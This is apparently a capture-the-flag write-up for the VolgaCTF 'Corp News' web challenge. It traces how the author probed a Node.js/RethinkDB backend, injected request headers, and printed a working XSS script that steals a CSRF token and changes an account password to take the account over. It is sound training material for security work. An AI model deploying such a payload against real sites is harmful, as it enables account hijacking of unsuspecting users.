# Web 300: Corp News
For this challenge we are given a web server and the hint: 'Some errors may shed light on what is there on the backend'

The web page has a few features all of which are implemented with jquery posts.
1. Login/Register either authenticates a user with a password or creates a new account, and lies about password requirements (it requires uppercase,lowercase and numbers)
2. Change password, POST to /change_password with json object including new_password, confirm_password, and a csrf token
3. Submit Feedback, POST to /feedback with json object {'comment':'text'}
4. Read private news POST to /news details below
5. a /feedback page that does not seem to actually display any comments

The hint makes it seem like there will be some kind of command/sql injection into the backend.
To start off, I used a quick python script to make the POST requests and return the error messages.
I frequently got Syntax Errors on my POST data, but only because it was being passed directly to JSON.parse, which was
determined from a stack trace it displayed in the error message. Which also identified the backed as nodejs.

After determining that those Syntax Errors did not lead to any command injection, I went to look at the read private news feature.
The server was making requests with the following json data, and always displayed the error message
```
var data = {'resultFormat': 'text'}
```
```
Please, set debug header true, because the app in developing state:)
```

When making requests with other values for resultFormat it responds saying the only supported result_format values are json, jsonp, binary, text, and auto.
After some googling for result_format and those options, I determined that the backend was likely running rethinkdb, and the 
json object was being passed as parameters to the rethinkdb.http function.

this was confirmed because I could use other parameters ('redirects' and 'header') to that function without the server throwing errors.
it turns out the 'header' parameter can take in a json object and send those headers to the server. Making the POST request with data
```
{'resultFormat':'text', 'header':{'debug':'true'}}
```
The server responded with text from the about page for VolgaCTF.

After poking around looking for command injection, another team member noticed there was a bot viewing the comments submitted,
and it allowed for XSS. Along with a little message displayed above the comments displaying a random username for the creator of the
website, it seemed the goal was to take over their account.

After a few trials making post requests to my own server to determine my payloads were working, I created a payload to
grab the csrf token from the password change form. The token changes quickly after the bot runs our payload, and I got invalid
token errors, so I expanded the payload to also change the account password.

```
<script>
var x = new XMLHttpRequest();
x.open("GET", "/lk", true);
x.onreadystatechange = function() {
    if (x.readyState == XMLHttpRequest.DONE) {
        text = x.responseText;
        text = text.substr(text.indexOf('invisible">') + 'invisible">'.length);
        csrf = text.substr(0, text.indexOf('</p>'));
        newdata = JSON.stringify({'new_password':'QWERTYqwerty1',confirm_password:'QWERTYqwerty1','token':csrf});
        y = new XMLHttpRequest();
        y.open("POST", "/change_password", true);
        y.setRequestHeader("Content-type", "application/json");
        y.send(newdata);
    }
};
x.send(null);
</script>
```

Once the password was changed I logged into the user's account and the profile page had an interesting notice
```
Your Secret header: asdJHF7dsJF65$FKFJjfjd773ehd5fjsdf7 
```

going back to the private news form, I POSTed the json data
```
{'header': {'debug':'true', 'Secret':'asdJHF7dsJF65$FKFJjfjd773ehd5fjsdf7'}}
```

and it responded with the flag
VolgaCTF{rethinkdb_nearly_without_nosqlInj_and_some_clientside}
